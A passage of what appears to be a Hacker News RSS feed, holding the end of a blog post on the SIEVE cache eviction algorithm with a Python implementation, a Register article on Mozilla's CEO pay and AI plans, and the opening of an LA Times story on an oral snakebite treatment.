SIEVE takes a different approach, eliminating the need for promotion with each cache hit. This simplicity pays off. On a single thread, SIEVE is 16% faster than the spruced-up LRU and 17% quicker than TwoQ on both traces. When ramped up to 16 threads, SIEVE's throughput more than doubles compared to these algorithms on the Meta trace, showcasing its effortless scalability. --> <h3 id="sieve-is-beyond-an-eviction-algorithm">SIEVE is beyond an eviction algorithm<a href="#sieve-is-beyond-an-eviction-algorithm" title="Permanent link">¶</a></h3> <p>SIEVE isn't just playing the part of a cache eviction algorithm; it's stepping up as a cache design superstar. Think of it like giving a fresh spin to classics. We've plugged SIEVE into <a href="https://www.usenix.org/conference/hotstorage18/presentation/vietri">LeCaR</a>, <a href="https://www.vldb.org/conf/1994/P439.PDF">TwoQ</a>, <a href="https://www.usenix.org/conference/fast-03/arc-self-tuning-low-overhead-replacement-cache">ARC</a>, and <a href="https://dl.acm.org/doi/10.1145/3600006.3613147">S3-FIFO</a>, swapping out their LRU or FIFO queue for a SIEVE one.</p> <p>Swapping LRU with SIEVE in these algorithms isn't just a minor tweak; it's more like giving them a turbo boost. Take ARC-SIEVE, for instance – it's turning heads with its slick efficiency, especially noticeable across different cache sizes. We didn't stop there. We pushed SIEVE a bit further by letting it peek into the future – well, sort of. We tested how well it could guess the next request. It turns out, with this extra bit of foresight, SIEVE is nailing it, outperforming the rest in almost all scenarios.</p> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/sieve_queue_all_large.svg" alt="figure-sieve-efficiency-small"> </p> <!-- <figcaption>An iilustration of SIEVE</figcaption> --> </figure> <h3 id="sieve-is-not-scan-resistant">SIEVE is not scan-resistant<a href="#sieve-is-not-scan-resistant" title="Permanent link">¶</a></h3> <p>Besides web cache workloads, we evaluated SIEVE on some block cache workloads. However, we find that SIEVE sometimes shows a miss ratio higher than LRU. The primary reason for this discrepancy is that SIEVE is not scan-resistant. In block cache workloads, which frequently feature scans, popular objects often intermingle with objects from scans. Consequently, both types of objects are rapidly evicted after insertion.</p> <p><a href="https://brooker.co.za/blog/2023/12/15/sieve.html">Marc's latest blog post</a> has explored the idea of making sieve scan-resistant by adding a small counter for each item. It shows some wins and losses on different workloads. We're really excited to see how this plays out in the real world. If you're an engineer, a tech enthusiast, or just someone who enjoys playing around with systems, we'd absolutely love for you to give SIEVE a whirl in your setups. </p> <h2 id="wed-love-to-hear-from-you">We'd Love to Hear from you<a href="#wed-love-to-hear-from-you" title="Permanent link">¶</a></h2> <p>As we wrap up this blog post, we would like to give a big shoutout to the people and organizations that open-sourced and shared the traces. We believe SIEVE presents an intriguing opportunity to explore and enhance the efficiency of web caching. <strong>If you have questions, thoughts, or if you've given SIEVE a try, we're eager to hear from you! Don't hesitate to get in touch :-)</strong></p> <h2 id="appendix">Appendix<a href="#appendix" title="Permanent link">¶</a></h2> <div id="sieve-cache-code"><p><span>SIEVE Python Implementation</span></p><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span>class</span> <span>Node</span><span>:</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>value</span><span>):</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>        <span>self</span><span>.</span><span>value</span> <span>=</span> <span>value</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>        <span>self</span><span>.</span><span>visited</span> <span>=</span> <span>False</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>        <span>self</span><span>.</span><span>prev</span> <span>=</span> <span>None</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>        <span>self</span><span>.</span><span>next</span> <span>=</span> <span>None</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span>class</span> <span>SieveCache</span><span>:</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>capacity</span><span>):</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>        <span>self</span><span>.</span><span>capacity</span> <span>=</span> <span>capacity</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>        <span>self</span><span>.</span><span>cache</span> <span>=</span> <span>{}</span>  <span># To store cache items as {value: node}</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>        <span>self</span><span>.</span><span>head</span> <span>=</span> <span>None</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>        <span>self</span><span>.</span><span>tail</span> <span>=</span> <span>None</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>        <span>self</span><span>.</span><span>hand</span> <span>=</span> <span>None</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>        <span>self</span><span>.</span><span>size</span> <span>=</span> <span>0</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>    <span>def</span> <span>_add_to_head</span><span>(</span><span>self</span><span>,</span> <span>node</span><span>):</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>        <span>node</span><span>.</span><span>next</span> <span>=</span> <span>self</span><span>.</span><span>head</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>        <span>node</span><span>.</span><span>prev</span> <span>=</span> <span>None</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>        <span>if</span> <span>self</span><span>.</span><span>head</span><span>:</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>            <span>self</span><span>.</span><span>head</span><span>.</span><span>prev</span> <span>=</span> <span>node</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>        <span>self</span><span>.</span><span>head</span> <span>=</span> <span>node</span>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>        <span>if</span> <span>self</span><span>.</span><span>tail</span> <span>is</span> <span>None</span><span>:</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>            <span>self</span><span>.</span><span>tail</span> <span>=</span> <span>node</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>    <span>def</span> <span>_remove_node</span><span>(</span><span>self</span><span>,</span> <span>node</span><span>):</span>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>        <span>if</span> <span>node</span><span>.</span><span>prev</span><span>:</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>            <span>node</span><span>.</span><span>prev</span><span>.</span><span>next</span> <span>=</span> <span>node</span><span>.</span><span>next</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>        <span>else</span><span>:</span>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>            <span>self</span><span>.</span><span>head</span> <span>=</span> <span>node</span><span>.</span><span>next</span>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>        <span>if</span> <span>node</span><span>.</span><span>next</span><span>:</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>            <span>node</span><span>.</span><span>next</span><span>.</span><span>prev</span> <span>=</span> <span>node</span><span>.</span><span>prev</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>        <span>else</span><span>:</span>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>            <span>self</span><span>.</span><span>tail</span> <span>=</span> <span>node</span><span>.</span><span>prev</span>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>    <span>def</span> <span>_evict</span><span>(</span><span>self</span><span>):</span>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>        <span>obj</span> <span>=</span> <span>self</span><span>.</span><span>hand</span> <span>if</span> <span>self</span><span>.</span><span>hand</span> <span>else</span> <span>self</span><span>.</span><span>tail</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>        <span>while</span> <span>obj</span> <span>and</span> <span>obj</span><span>.</span><span>visited</span><span>:</span>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>            <span>obj</span><span>.</span><span>visited</span> <span>=</span> <span>False</span>
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>            <span>obj</span> <span>=</span> <span>obj</span><span>.</span><span>prev</span> <span>if</span> <span>obj</span><span>.</span><span>prev</span> <span>else</span> <span>self</span><span>.</span><span>tail</span>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>        <span>self</span><span>.</span><span>hand</span> <span>=</span> <span>obj</span><span>.</span><span>prev</span> <span>if</span> <span>obj</span><span>.</span><span>prev</span> <span>else</span> <span>None</span>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>        <span>del</span> <span>self</span><span>.</span><span>cache</span><span>[</span><span>obj</span><span>.</span><span>value</span><span>]</span>
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>        <span>self</span><span>.</span><span>_remove_node</span><span>(</span><span>obj</span><span>)</span>
</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>        <span>self</span><span>.</span><span>size</span> <span>-=</span> <span>1</span>
</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>
</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>    <span>def</span> <span>access</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>):</span>
</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>        <span>if</span> <span>x</span> <span>in</span> <span>self</span><span>.</span><span>cache</span><span>:</span>  <span># Cache Hit</span>
</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>            <span>node</span> <span>=</span> <span>self</span><span>.</span><span>cache</span><span>[</span><span>x</span><span>]</span>
</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>            <span>node</span><span>.</span><span>visited</span> <span>=</span> <span>True</span>
</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>        <span>else</span><span>:</span>  <span># Cache Miss</span>
</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>            <span>if</span> <span>self</span><span>.</span><span>size</span> <span>==</span> <span>self</span><span>.</span><span>capacity</span><span>:</span>  <span># Cache Full</span>
</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>                <span>self</span><span>.</span><span>_evict</span><span>()</span>  <span># Eviction</span>
</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>            <span>new_node</span> <span>=</span> <span>Node</span><span>(</span><span>x</span><span>)</span>
</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>            <span>self</span><span>.</span><span>_add_to_head</span><span>(</span><span>new_node</span><span>)</span>
</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>            <span>self</span><span>.</span><span>cache</span><span>[</span><span>x</span><span>]</span> <span>=</span> <span>new_node</span>
</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>            <span>self</span><span>.</span><span>size</span> <span>+=</span> <span>1</span>
</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>            <span>new_node</span><span>.</span><span>visited</span> <span>=</span> <span>False</span>  <span># Insertion</span>
</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>
</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>    <span>def</span> <span>show_cache</span><span>(</span><span>self</span><span>):</span>
</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>        <span>current</span> <span>=</span> <span>self</span><span>.</span><span>head</span>
</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>        <span>while</span> <span>current</span><span>:</span>
</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>            <span>print</span><span>(</span><span>f</span><span>'</span><span>{</span><span>current</span><span>.</span><span>value</span><span>}</span><span> (Visited: </span><span>{</span><span>current</span><span>.</span><span>visited</span><span>}</span><span>)'</span><span>,</span> <span>end</span><span>=</span><span>' -&gt; '</span> <span>if</span> <span>current</span><span>.</span><span>next</span> <span>else</span> <span>'</span><span>\n</span><span>'</span><span>)</span>
</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>            <span>current</span> <span>=</span> <span>current</span><span>.</span><span>next</span>
</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>
</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a><span># Example usage</span>
</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a><span>cache</span> <span>=</span> <span>SieveCache</span><span>(</span><span>3</span><span>)</span>
</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'A'</span><span>)</span>
</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'B'</span><span>)</span>
</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'C'</span><span>)</span>
</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'D'</span><span>)</span>
</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a><span>cache</span><span>.</span><span>show_cache</span><span>()</span>
</span></code></pre></div> </article> </div>  </main>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[With revenue and users declining, Mozilla CEO gets a 20% raise (355 pts)]]></title>
            <link>https://www.theregister.com/2024/01/02/mozilla_in_2024_ai_privacy/</link>
            <guid>38849580</guid>
            <pubDate>Wed, 03 Jan 2024 01:29:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2024/01/02/mozilla_in_2024_ai_privacy/">https://www.theregister.com/2024/01/02/mozilla_in_2024_ai_privacy/</a>, See on <a href="https://news.ycombinator.com/item?id=38849580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>Mozilla closed out 2023 with a report that dodges its flatlining browser market share and Mozilla.social beta in favor of calls for a faster pace from its highly paid CEO.</p>
<p>According to the company's filings, Mitchell Baker's compensation went from $5,591,406 <a target="_blank" rel="nofollow" href="https://assets.mozilla.net/annualreport/2021/mozilla-fdn-990-ty21-public-disclosure.pdf">in 2021</a> [PDF] to $6,903,089 <a target="_blank" rel="nofollow" href="https://assets.mozilla.net/annualreport/2022/mozilla-fdn-990-ty22-public-disclosure.pdf">in 2022</a> [PDF]. It's quite the jump considering that revenues declined from $527,585,000 to $510,389,000 in <a target="_blank" rel="nofollow" href="https://assets.mozilla.net/annualreport/2022/mozilla-fdn-2022-fs-final-0908.pdf">the same period</a> [PDF].</p>
<p>Despite the executive payout, Firefox continues to trail Google and even Microsoft in desktop browser market share. While it has not suffered any catastrophic losses, neither has it made any significant gains.</p>

    

<p>Baker, however, would very much like to speed things up and says in the <a target="_blank" rel="nofollow" href="https://stateof.mozilla.org/#">State of Mozilla report</a>: "The pace is not enough, the impact is not enough."</p>

        


        

<p>Unsurprisingly for a technology company, the report is heavy on AI going mainstream where Mozilla reckons it can make an impact in the technology, particularly with regard to open source developers and privacy.</p>
<p>Mozilla's adventures in AI? The organization says it has 15 engineers working on open source large language models and is working on use cases in the healthcare space. Moez Draief, managing director of Mozilla.ai, said: "There's a lot of structured data work in that industry that will feed the language models; we don't have to invent it."</p>
<ul>

<li><a href="https://www.theregister.com/2023/12/21/mozilla_decides_trusted_types_is/">Mozilla decides Trusted Types is a worthy security feature</a></li>

<li><a href="https://www.theregister.com/2023/12/20/firefox_121_released/">Penguins get their Wayland with Firefox 121</a></li>

<li><a href="https://www.theregister.com/2023/11/21/ad_block_google/">Firefox slow to load YouTube? Just another front in Google's war on ad blockers</a></li>

<li><a href="https://www.theregister.com/2023/11/15/google_amazon_microsoft_mozilla/">Google, Amazon, Microsoft make the Mozilla naughty list for Christmas shopping</a></li>
</ul>
<p>Earlier this year, Mozilla had to <a target="_blank" href="https://www.theregister.com/2023/07/06/mozilla_ai_explain_shift/">hit pause on its AI chatbot</a> after the service served up a worrying amount of nonsense in response to user queries.</p>
<p>Chief product officer Steve Teixeira notes in the report the rapid growth of AI and social networks, although warns that Mozilla.social is unlikely to move beyond the experimentation phase in 2024. He says that Mozilla would be "exploring ways to better integrate advertising while adhering to our focus on privacy and choice," including web browsing.</p>

        

<p>Teixeira also acknowledged subscription services such as Mozilla VPN and Relay.</p>
<p>It will be interesting to see how Mozilla picks up the pace in 2024. As well as Teixeira's comments regarding advertising, Baker notes: "We need to be faster in prototyping, launching, learning, and iterating ... This requires rich data, and so we will be moving in that direction, but in a very Mozilla way."</p>
<p>Surely not slurping telemetry?</p>

        

<p>According to the report, the "Mozilla way" is all about privacy, encryption, and keeping customer data safe. Hopefully, it will also be about <a target="_blank" href="https://www.theregister.com/2023/09/29/mozilla_asleep_at_wheel/">innovation</a> rather than scattering AI fairy dust over its product line. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Can a pill prevent deaths from venomous snakebites? (106 pts)]]></title>
            <link>https://www.latimes.com/environment/story/2023-12-24/can-a-pill-prevent-deaths-from-venomous-snake-bites</link>
            <guid>38848566</guid>
            <pubDate>Tue, 02 Jan 2024 23:26:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.latimes.com/environment/story/2023-12-24/can-a-pill-prevent-deaths-from-venomous-snake-bites">https://www.latimes.com/environment/story/2023-12-24/can-a-pill-prevent-deaths-from-venomous-snake-bites</a>, See on <a href="https://news.ycombinator.com/item?id=38848566">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-element="story-body" data-dateline="" data-subscriber-content="">  <p><span>SAN FRANCISCO&nbsp;—&nbsp;</span></p><p>John Heenan knows the terror of feeling a sting on his foot, then looking down and seeing two bright red puncture wounds about an inch apart and a massive rattlesnake slithering away into tall grass.</p><p>It was a summer morning in 2017, and the 74-year-old horticulturist was carrying a box of fruit in a Marin County orchard when, he said, “I stepped right on him, then called out to a partner, ‘Hey, I’ve been bitten by a rattlesnake.’”</p><p>It’s a snapshot imprinted in Heenan’s brain. “The fangs struck a vein, and I could feel the venom moving throughout my system,” he recalled, wincing at the memory. “I started seizing up, and struggled to breathe as though I had the wind knocked out of me.”</p><div data-click="enhancement" data-module-id="0000018a-d215-de7e-a3ce-d715a9510002" data-align-center="">  <div>   <a href="https://www.latimes.com/environment"><picture>     <img alt="Climate California" width="510" height="161" src="https://ca-times.brightspotcdn.com/90/bb/022ad6e14f6487f2d58336619061/climatecasvg-padding.svg" decoding="async" loading="lazy">  </picture></a>   </div>     <p>Aggressive and impactful reporting on climate change, the environment, health and science.</p>      </div><p>Heenan was rushed to a hospital, where he spent the next four days in a coma. During that time, he was administered 28 vials of antivenom intravenously at a cost of $3,400 per vial. </p><p>When he regained consciousness, there were two people at his bedside, his wife and expedition doctor Matthew Lewin, who smiled and said, “You are one lucky guy.”</p><div data-click="enhancement" data-align-center=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/e8c461e/2147483647/strip/true/crop/3024x4032+0+0/resize/320x427!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/29a3da5/2147483647/strip/true/crop/3024x4032+0+0/resize/568x757!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/9c1dae4/2147483647/strip/true/crop/3024x4032+0+0/resize/768x1024!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/e6d3011/2147483647/strip/true/crop/3024x4032+0+0/resize/1080x1440!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/af29672/2147483647/strip/true/crop/3024x4032+0+0/resize/1240x1654!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/15f99cd/2147483647/strip/true/crop/3024x4032+0+0/resize/1440x1920!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/48856ec/2147483647/strip/true/crop/3024x4032+0+0/resize/2160x2880!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 2160w" sizes="100vw">     <img alt="A man gestures to another man while the pair stand in an orchard." srcset="https://ca-times.brightspotcdn.com/dims4/default/4492a05/2147483647/strip/true/crop/3024x4032+0+0/resize/320x427!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/0b9f240/2147483647/strip/true/crop/3024x4032+0+0/resize/568x757!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/ce6720c/2147483647/strip/true/crop/3024x4032+0+0/resize/768x1024!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/09f6140/2147483647/strip/true/crop/3024x4032+0+0/resize/1080x1440!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/e8217fd/2147483647/strip/true/crop/3024x4032+0+0/resize/1240x1654!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/262ceea/2147483647/strip/true/crop/3024x4032+0+0/resize/1440x1920!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/8705d55/2147483647/strip/true/crop/3024x4032+0+0/resize/2160x2880!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 2160w" sizes="100vw" width="2000" height="2667" src="https://ca-times.brightspotcdn.com/dims4/default/cd36856/2147483647/strip/true/crop/3024x4032+0+0/resize/2000x2667!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG" decoding="async" loading="lazy">  </picture>  <div>   <p>Matthew Lewin, left, and John  Heenan  stand in the  orchard  where Heenan  was bitten by a 5 1/2-foot-long Pacific rattlesnake. The horticulturist at Indian Valley Campus of the College of Marin went into a coma for four days.</p>   <p>(Louis Sahagun / Los Angeles Times)</p>   </div>  </figure></div><p>Heenan would later learn that Lewin was hot on the trail of a novel treatment for the long, agonizing and often deadly effects of venomous snakebites: It’s a pill that he says “is intended to at least buy victims enough time to get to the hospital.”</p><p>Snake venom is a complex cocktail of toxins, amino acids and proteins that evolved primarily to immobilize and kill prey, but it also  prepares tissues for digestion. In humans, venom causes severe swelling and instability of blood pressure, neuromuscular weakness and paralysis, hemorrhaging, and the death of skeletal muscle, leading to permanent tissue loss and amputations.</p><p>The World Health Organization estimates that 138,000 people are killed by venomous snakes annually, and most of them die before they can reach emergency medical care. This suffering goes on with little outrage or publicity because snakebites most often occur in impoverished, backwater areas, and there is no easy way to treat snakebite in the field.</p><p> Nature has provided an abundance of slithering assailants to watch out for: rattlesnakes, copperheads, water moccasins and coral snakes in the United States; kraits in Southeast Asia; taipans in Australia; Nikolsky’s vipers in Ukraine; Gaboon vipers with 2-inch-long fangs in Africa; and bushmasters in Central America. Then there are Russel’s vipers, big, irritable snakes responsible for 25,000 fatalities in India annually.</p><p>Typical standard-of-care antivenoms are extremely expensive, require refrigeration and must be administered intravenously in a hospital setting. They are also species-specific, meaning selecting proper antivenom requires knowing which type of snake bit you. </p><p>As a result, survivors of rattlesnake bites in Southern California, for instance, get a second painful surprise when presented with hospital bills totaling hundreds of thousands of dollars.</p><div data-click="enhancement" data-align-right=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/3a4ebe2/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/d705c01/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 